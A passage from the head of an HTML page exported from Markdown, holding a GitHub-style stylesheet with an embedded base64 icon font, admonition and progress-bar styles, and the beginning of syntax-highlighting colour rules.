<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><style>body {
  max-width: 980px;
  border: 1px solid #ddd;
  outline: 1300px solid #fff;
  margin: 16px auto;
}

body .markdown-body
{
  padding: 45px;
}

@font-face {
  font-family: fontawesome-mini;
  src: url(data:font/woff;charset=utf-8;base64,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) format('woff');
}

.markdown-body {
  font-family: sans-serif;
  -ms-text-size-adjust: 100%;
  -webkit-text-size-adjust: 100%;
  color: #333333;
  overflow: hidden;
  font-family: "Helvetica Neue", Helvetica, "Segoe UI", Arial, freesans, sans-serif;
  font-size: 16px;
  line-height: 1.6;
  word-wrap: break-word;
}

.markdown-body a {
  background: transparent;
}

.markdown-body a:active,
.markdown-body a:hover {
  outline: 0;
}

.markdown-body b,
.markdown-body strong {
  font-weight: bold;
}

.markdown-body mark {
  background: #ff0;
  color: #000;
  font-style: italic;
  font-weight: bold;
}

.markdown-body sub,
.markdown-body sup {
  font-size: 75%;
  line-height: 0;
  position: relative;
  vertical-align: baseline;
}
.markdown-body sup {
  top: -0.5em;
}
.markdown-body sub {
  bottom: -0.25em;
}

.markdown-body h1 {
  font-size: 2em;
  margin: 0.67em 0;
}

.markdown-body img {
  border: 0;
}

.markdown-body hr {
  -moz-box-sizing: content-box;
  box-sizing: content-box;
  height: 0;
}

.markdown-body pre {
  overflow: auto;
}

.markdown-body code,
.markdown-body kbd,
.markdown-body pre,
.markdown-body samp {
  font-family: monospace, monospace;
  font-size: 1em;
}

.markdown-body input {
  color: inherit;
  font: inherit;
  margin: 0;
}

.markdown-body html input[disabled] {
  cursor: default;
}

.markdown-body input {
  line-height: normal;
}

.markdown-body input[type="checkbox"] {
  box-sizing: border-box;
  padding: 0;
}

.markdown-body table {
  border-collapse: collapse;
  border-spacing: 0;
}

.markdown-body td,
.markdown-body th {
  padding: 0;
}

.markdown-body .codehilitetable {
  border: 0;
  border-spacing: 0;
}

.markdown-body .codehilitetable tr {
  border: 0;
}

.markdown-body .codehilitetable pre,
.markdown-body .codehilitetable div.codehilite {
  margin: 0;
}

.markdown-body .linenos,
.markdown-body .code,
.markdown-body .codehilitetable td {
  border: 0;
  padding: 0;
}

.markdown-body td:not(.linenos) .linenodiv {
  padding: 0 !important;
}

.markdown-body .code {
  width: 100%;
}

.markdown-body .linenos div pre,
.markdown-body .linenodiv pre,
.markdown-body .linenodiv {
  border: 0;
  -webkit-border-radius: 0;
  -moz-border-radius: 0;
  border-radius: 0;
  -webkit-border-top-left-radius: 3px;
  -webkit-border-bottom-left-radius: 3px;
  -moz-border-radius-topleft: 3px;
  -moz-border-radius-bottomleft: 3px;
  border-top-left-radius: 3px;
  border-bottom-left-radius: 3px;
}

.markdown-body .code div pre,
.markdown-body .code div {
  border: 0;
  -webkit-border-radius: 0;
  -moz-border-radius: 0;
  border-radius: 0;
  -webkit-border-top-right-radius: 3px;
  -webkit-border-bottom-right-radius: 3px;
  -moz-border-radius-topright: 3px;
  -moz-border-radius-bottomright: 3px;
  border-top-right-radius: 3px;
  border-bottom-right-radius: 3px;
}

.markdown-body * {
  -moz-box-sizing: border-box;
  box-sizing: border-box;
}

.markdown-body input {
  font: 13px Helvetica, arial, freesans, clean, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol";
  line-height: 1.4;
}

.markdown-body a {
  color: #4183c4;
  text-decoration: none;
}

.markdown-body a:hover,
.markdown-body a:focus,
.markdown-body a:active {
  text-decoration: underline;
}

.markdown-body hr {
  height: 0;
  margin: 15px 0;
  overflow: hidden;
  background: transparent;
  border: 0;
  border-bottom: 1px solid #ddd;
}

.markdown-body hr:before,
.markdown-body hr:after {
  display: table;
  content: " ";
}

.markdown-body hr:after {
  clear: both;
}

.markdown-body h1,
.markdown-body h2,
.markdown-body h3,
.markdown-body h4,
.markdown-body h5,
.markdown-body h6 {
  margin-top: 15px;
  margin-bottom: 15px;
  line-height: 1.1;
}

.markdown-body h1 {
  font-size: 30px;
}

.markdown-body h2 {
  font-size: 21px;
}

.markdown-body h3 {
  font-size: 16px;
}

.markdown-body h4 {
  font-size: 14px;
}

.markdown-body h5 {
  font-size: 12px;
}

.markdown-body h6 {
  font-size: 11px;
}

.markdown-body blockquote {
  margin: 0;
}

.markdown-body ul,
.markdown-body ol {
  padding: 0;
  margin-top: 0;
  margin-bottom: 0;
}

.markdown-body ol ol,
.markdown-body ul ol {
  list-style-type: lower-roman;
}

.markdown-body ul ul ol,
.markdown-body ul ol ol,
.markdown-body ol ul ol,
.markdown-body ol ol ol {
  list-style-type: lower-alpha;
}

.markdown-body dd {
  margin-left: 0;
}

.markdown-body code,
.markdown-body pre,
.markdown-body samp {
  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
  font-size: 12px;
}

.markdown-body pre {
  margin-top: 0;
  margin-bottom: 0;
}

.markdown-body kbd {
  background-color: #e7e7e7;
  background-image: -moz-linear-gradient(#fefefe, #e7e7e7);
  background-image: -webkit-linear-gradient(#fefefe, #e7e7e7);
  background-image: linear-gradient(#fefefe, #e7e7e7);
  background-repeat: repeat-x;
  border-radius: 2px;
  border: 1px solid #cfcfcf;
  color: #000;
  padding: 3px 5px;
  line-height: 10px;
  font: 11px Consolas, "Liberation Mono", Menlo, Courier, monospace;
  display: inline-block;
}

.markdown-body>*:first-child {
  margin-top: 0 !important;
}

.markdown-body>*:last-child {
  margin-bottom: 0 !important;
}

.markdown-body .headerlink {
  font: normal 400 16px fontawesome-mini;
  vertical-align: middle;
  margin-left: -16px;
  float: left;
  display: inline-block;
  text-decoration: none;
  opacity: 0;
  color: #333;
}

.markdown-body .headerlink:focus {
  outline: none;
}

.markdown-body h1 .headerlink {
  margin-top: 0.8rem;
}

.markdown-body h2 .headerlink,
.markdown-body h3 .headerlink {
  margin-top: 0.6rem;
}

.markdown-body h4 .headerlink {
  margin-top: 0.2rem;
}

.markdown-body h5 .headerlink,
.markdown-body h6 .headerlink {
  margin-top: 0;
}

.markdown-body .headerlink:hover,
.markdown-body h1:hover .headerlink,
.markdown-body h2:hover .headerlink,
.markdown-body h3:hover .headerlink,
.markdown-body h4:hover .headerlink,
.markdown-body h5:hover .headerlink,
.markdown-body h6:hover .headerlink {
  opacity: 1;
  text-decoration: none;
}

.markdown-body h1 {
  padding-bottom: 0.3em;
  font-size: 2.25em;
  line-height: 1.2;
  border-bottom: 1px solid #eee;
}

.markdown-body h2 {
  padding-bottom: 0.3em;
  font-size: 1.75em;
  line-height: 1.225;
  border-bottom: 1px solid #eee;
}

.markdown-body h3 {
  font-size: 1.5em;
  line-height: 1.43;
}

.markdown-body h4 {
  font-size: 1.25em;
}

.markdown-body h5 {
  font-size: 1em;
}

.markdown-body h6 {
  font-size: 1em;
  color: #777;
}

.markdown-body p,
.markdown-body blockquote,
.markdown-body ul,
.markdown-body ol,
.markdown-body dl,
.markdown-body table,
.markdown-body pre,
.markdown-body .admonition {
  margin-top: 0;
  margin-bottom: 16px;
}

.markdown-body hr {
  height: 4px;
  padding: 0;
  margin: 16px 0;
  background-color: #e7e7e7;
  border: 0 none;
}

.markdown-body ul,
.markdown-body ol {
  padding-left: 2em;
}

.markdown-body ul ul,
.markdown-body ul ol,
.markdown-body ol ol,
.markdown-body ol ul {
  margin-top: 0;
  margin-bottom: 0;
}

.markdown-body li>p {
  margin-top: 16px;
}

.markdown-body dl {
  padding: 0;
}

.markdown-body dl dt {
  padding: 0;
  margin-top: 16px;
  font-size: 1em;
  font-style: italic;
  font-weight: bold;
}

.markdown-body dl dd {
  padding: 0 16px;
  margin-bottom: 16px;
}

.markdown-body blockquote {
  padding: 0 15px;
  color: #777;
  border-left: 4px solid #ddd;
}

.markdown-body blockquote>:first-child {
  margin-top: 0;
}

.markdown-body blockquote>:last-child {
  margin-bottom: 0;
}

.markdown-body table {
  display: block;
  width: 100%;
  overflow: auto;
  word-break: normal;
  word-break: keep-all;
}

.markdown-body table th {
  font-weight: bold;
}

.markdown-body table th,
.markdown-body table td {
  padding: 6px 13px;
  border: 1px solid #ddd;
}

.markdown-body table tr {
  background-color: #fff;
  border-top: 1px solid #ccc;
}

.markdown-body table tr:nth-child(2n) {
  background-color: #f8f8f8;
}

.markdown-body img {
  max-width: 100%;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
}

.markdown-body code,
.markdown-body samp {
  padding: 0;
  padding-top: 0.2em;
  padding-bottom: 0.2em;
  margin: 0;
  font-size: 85%;
  background-color: rgba(0,0,0,0.04);
  border-radius: 3px;
}

.markdown-body code:before,
.markdown-body code:after {
  letter-spacing: -0.2em;
  content: "\00a0";
}

.markdown-body pre>code {
  padding: 0;
  margin: 0;
  font-size: 100%;
  word-break: normal;
  white-space: pre;
  background: transparent;
  border: 0;
}

.markdown-body .codehilite {
  margin-bottom: 16px;
}

.markdown-body .codehilite pre,
.markdown-body pre {
  padding: 16px;
  overflow: auto;
  font-size: 85%;
  line-height: 1.45;
  background-color: #f7f7f7;
  border-radius: 3px;
}

.markdown-body .codehilite pre {
  margin-bottom: 0;
  word-break: normal;
}

.markdown-body pre {
  word-wrap: normal;
}

.markdown-body pre code {
  display: inline;
  max-width: initial;
  padding: 0;
  margin: 0;
  overflow: initial;
  line-height: inherit;
  word-wrap: normal;
  background-color: transparent;
  border: 0;
}

.markdown-body pre code:before,
.markdown-body pre code:after {
  content: normal;
}

/* Admonition */
.markdown-body .admonition {
  -webkit-border-radius: 3px;
  -moz-border-radius: 3px;
  position: relative;
  border-radius: 3px;
  border: 1px solid #e0e0e0;
  border-left: 6px solid #333;
  padding: 10px 10px 10px 30px;
}

.markdown-body .admonition table {
  color: #333;
}

.markdown-body .admonition p {
  padding: 0;
}

.markdown-body .admonition-title {
  font-weight: bold;
  margin: 0;
}

.markdown-body .admonition>.admonition-title {
  color: #333;
}

.markdown-body .attention>.admonition-title {
  color: #a6d796;
}

.markdown-body .caution>.admonition-title {
  color: #d7a796;
}

.markdown-body .hint>.admonition-title {
  color: #96c6d7;
}

.markdown-body .danger>.admonition-title {
  color: #c25f77;
}

.markdown-body .question>.admonition-title {
  color: #96a6d7;
}

.markdown-body .note>.admonition-title {
  color: #d7c896;
}

.markdown-body .admonition:before,
.markdown-body .attention:before,
.markdown-body .caution:before,
.markdown-body .hint:before,
.markdown-body .danger:before,
.markdown-body .question:before,
.markdown-body .note:before {
  font: normal normal 16px fontawesome-mini;
  -moz-osx-font-smoothing: grayscale;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
  line-height: 1.5;
  color: #333;
  position: absolute;
  left: 0;
  top: 0;
  padding-top: 10px;
  padding-left: 10px;
}

.markdown-body .admonition:before {
  content: "\f056\00a0";
  color: 333;
}

.markdown-body .attention:before {
  content: "\f058\00a0";
  color: #a6d796;
}

.markdown-body .caution:before {
  content: "\f06a\00a0";
  color: #d7a796;
}

.markdown-body .hint:before {
  content: "\f05a\00a0";
  color: #96c6d7;
}

.markdown-body .danger:before {
  content: "\f057\00a0";
  color: #c25f77;
}

.markdown-body .question:before {
  content: "\f059\00a0";
  color: #96a6d7;
}

.markdown-body .note:before {
  content: "\f040\00a0";
  color: #d7c896;
}

.markdown-body .admonition::after {
  content: normal;
}

.markdown-body .attention {
  border-left: 6px solid #a6d796;
}

.markdown-body .caution {
  border-left: 6px solid #d7a796;
}

.markdown-body .hint {
  border-left: 6px solid #96c6d7;
}

.markdown-body .danger {
  border-left: 6px solid #c25f77;
}

.markdown-body .question {
  border-left: 6px solid #96a6d7;
}

.markdown-body .note {
  border-left: 6px solid #d7c896;
}

.markdown-body .admonition>*:first-child {
  margin-top: 0 !important;
}

.markdown-body .admonition>*:last-child {
  margin-bottom: 0 !important;
}

/* progress bar*/
.markdown-body .progress {
  display: block;
  width: 300px;
  margin: 10px 0;
  height: 24px;
  -webkit-border-radius: 3px;
  -moz-border-radius: 3px;
  border-radius: 3px;
  background-color: #ededed;
  position: relative;
  box-shadow: inset -1px 1px 3px rgba(0, 0, 0, .1);
}

.markdown-body .progress-label {
  position: absolute;
  text-align: center;
  font-weight: bold;
  width: 100%; margin: 0;
  line-height: 24px;
  color: #333;
  text-shadow: 1px 1px 0 #fefefe, -1px -1px 0 #fefefe, -1px 1px 0 #fefefe, 1px -1px 0 #fefefe, 0 1px 0 #fefefe, 0 -1px 0 #fefefe, 1px 0 0 #fefefe, -1px 0 0 #fefefe, 1px 1px 2px #000;
  -webkit-font-smoothing: antialiased !important;
  white-space: nowrap;
  overflow: hidden;
}

.markdown-body .progress-bar {
  height: 24px;
  float: left;
  -webkit-border-radius: 3px;
  -moz-border-radius: 3px;
  border-radius: 3px;
  background-color: #96c6d7;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, .5), inset 0 -1px 0 rgba(0, 0, 0, .1);
  background-size: 30px 30px;
  background-image: -webkit-linear-gradient(
    135deg, rgba(255, 255, 255, .4) 27%,
    transparent 27%,
    transparent 52%, rgba(255, 255, 255, .4) 52%,
    rgba(255, 255, 255, .4) 77%,
    transparent 77%, transparent
  );
  background-image: -moz-linear-gradient(
    135deg,
    rgba(255, 255, 255, .4) 27%, transparent 27%,
    transparent 52%, rgba(255, 255, 255, .4) 52%,
    rgba(255, 255, 255, .4) 77%, transparent 77%,
    transparent
  );
  background-image: -ms-linear-gradient(
    135deg,
    rgba(255, 255, 255, .4) 27%, transparent 27%,
    transparent 52%, rgba(255, 255, 255, .4) 52%,
    rgba(255, 255, 255, .4) 77%, transparent 77%,
    transparent
  );
  background-image: -o-linear-gradient(
    135deg,
    rgba(255, 255, 255, .4) 27%, transparent 27%,
    transparent 52%, rgba(255, 255, 255, .4) 52%,
    rgba(255, 255, 255, .4) 77%, transparent 77%,
    transparent
  );
  background-image: linear-gradient(
    135deg,
    rgba(255, 255, 255, .4) 27%, transparent 27%,
    transparent 52%, rgba(255, 255, 255, .4) 52%,
    rgba(255, 255, 255, .4) 77%, transparent 77%,
    transparent
  );
}

.markdown-body .progress-100plus .progress-bar {
  background-color: #a6d796;
}

.markdown-body .progress-80plus .progress-bar {
  background-color: #c6d796;
}

.markdown-body .progress-60plus .progress-bar {
  background-color: #d7c896;
}

.markdown-body .progress-40plus .progress-bar {
  background-color: #d7a796;
}

.markdown-body .progress-20plus .progress-bar {
  background-color: #d796a6;
}

.markdown-body .progress-0plus .progress-bar {
  background-color: #c25f77;
}

.markdown-body .candystripe-animate .progress-bar{
  -webkit-animation: animate-stripes 3s linear infinite;
  -moz-animation: animate-stripes 3s linear infinite;
  animation: animate-stripes 3s linear infinite;
}

@-webkit-keyframes animate-stripes {
  0% {
    background-position: 0 0;
  }

  100% {
    background-position: 60px 0;
  }
}

@-moz-keyframes animate-stripes {
  0% {
    background-position: 0 0;
  }

  100% {
    background-position: 60px 0;
  }
}

@keyframes animate-stripes {
  0% {
    background-position: 0 0;
  }

  100% {
    background-position: 60px 0;
  }
}

.markdown-body .gloss .progress-bar {
  box-shadow:
    inset 0 4px 12px rgba(255, 255, 255, .7),
    inset 0 -12px 0 rgba(0, 0, 0, .05);
}

/* MultiMarkdown Critic Blocks */
.markdown-body .critic_mark {
  background: #ff0;
}

.markdown-body .critic_delete {
  color: #c82829;
  text-decoration: line-through;
}

.markdown-body .critic_insert {
  color: #718c00 ;
  text-decoration: underline;
}

.markdown-body .critic_comment {
  color: #8e908c;
  font-style: italic;
}

.markdown-body .headeranchor {
  font: normal normal 16px fontawesome-mini;
  line-height: 1;
  display: inline-block;
  text-decoration: none;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

.headeranchor:before {
  content: '\e157';
}

.markdown-body .task-list-item {
  list-style-type: none;
}

.markdown-body .task-list-item+.task-list-item {
  margin-top: 3px;
}

.markdown-body .task-list-item input {
  margin: 0 4px 0.25em -20px;
  vertical-align: middle;
}

/* Media */
@media only screen and (min-width: 480px) {
  .markdown-body {
    font-size:14px;
  }
}

@media only screen and (min-width: 768px) {
  .markdown-body {
    font-size:16px;
  }
}

@media print {
  .markdown-body * {
    background: transparent !important;
    color: black !important;
    filter:none !important;
    -ms-filter: none !important;
  }

  .markdown-body {
    font-size:12pt;
    max-width:100%;
    outline:none;
    border: 0;
  }

  .markdown-body a,
  .markdown-body a:visited {
    text-decoration: underline;
  }

  .markdown-body .headeranchor-link {
    display: none;
  }

  .markdown-body a[href]:after {
    content: " (" attr(href) ")";
  }

  .markdown-body abbr[title]:after {
    content: " (" attr(title) ")";
  }

  .markdown-body .ir a:after,
  .markdown-body a[href^="javascript:"]:after,
  .markdown-body a[href^="#"]:after {
    content: "";
  }

  .markdown-body pre {
    white-space: pre;
    white-space: pre-wrap;
    word-wrap: break-word;
  }

  .markdown-body pre,
  .markdown-body blockquote {
    border: 1px solid #999;
    padding-right: 1em;
    page-break-inside: avoid;
  }

  .markdown-body .progress,
  .markdown-body .progress-bar {
    -moz-box-shadow: none;
    -webkit-box-shadow: none;
    box-shadow: none;
  }

  .markdown-body .progress {
    border: 1px solid #ddd;
  }

  .markdown-body .progress-bar {
    height: 22px;
    border-right: 1px solid #ddd;
  }

  .markdown-body tr,
  .markdown-body img {
    page-break-inside: avoid;
  }

  .markdown-body img {
    max-width: 100% !important;
  }

  .markdown-body p,
  .markdown-body h2,
  .markdown-body h3 {
    orphans: 3;
    widows: 3;
  }

  .markdown-body h2,
  .markdown-body h3 {
    page-break-after: avoid;
  }
}
</style><style>/*GitHub*/
.codehilite {background-color:#fff;color:#333333;}
.codehilite .hll {background-color:#ffffcc;}
.codehilite .c{color:#999988;font-style:italic}
.codehilite .err{color:#a61717;background-color:#e3d2d2}
.codehilite .k{font-weight:bold}
.codehilite .o{font-weight:bold}
.codehilite .cm{color:#999988;font-style:italic}
.codehilite .cp{color:#999999;font-weight:bold}
.codehilite .c1{color:#999988;font-style:italic}
.codehilite .cs{color:#999999;font-weight:bold;font-style:italic}
.codehilite .gd{color:#000000;background-color:#ffdddd}
.codehilite .ge{font-style:italic}
.codehilite .gr{color:#aa0000}
.codehilite .gh{color:#999999}
.codehilite .gi{color:#000000;background-color:#ddffdd}
.codehilite .go{color:#888888}
.codehilite .gp{color:#555555}
.codehilite .gs{font-weight:bold}
.codehilite .gu{color:#800080;font-weight:bold}
.codehilite .gt{color:#aa0000}
.codehilite .kc{font-weight:bold}
.codehilite .kd{font-weight:bold}
.codehilite .kn{font-weight:bold}
.codehilite .kp{font-weight:bold}
.codehilite .kr{font-weight:bold}
.codehilite .kt{color:#445588;font-weight:bold}
.codehilite .m{color:#009999}
.codehilite .s{color:#dd1144}
.codehilite .n{color:#333333}
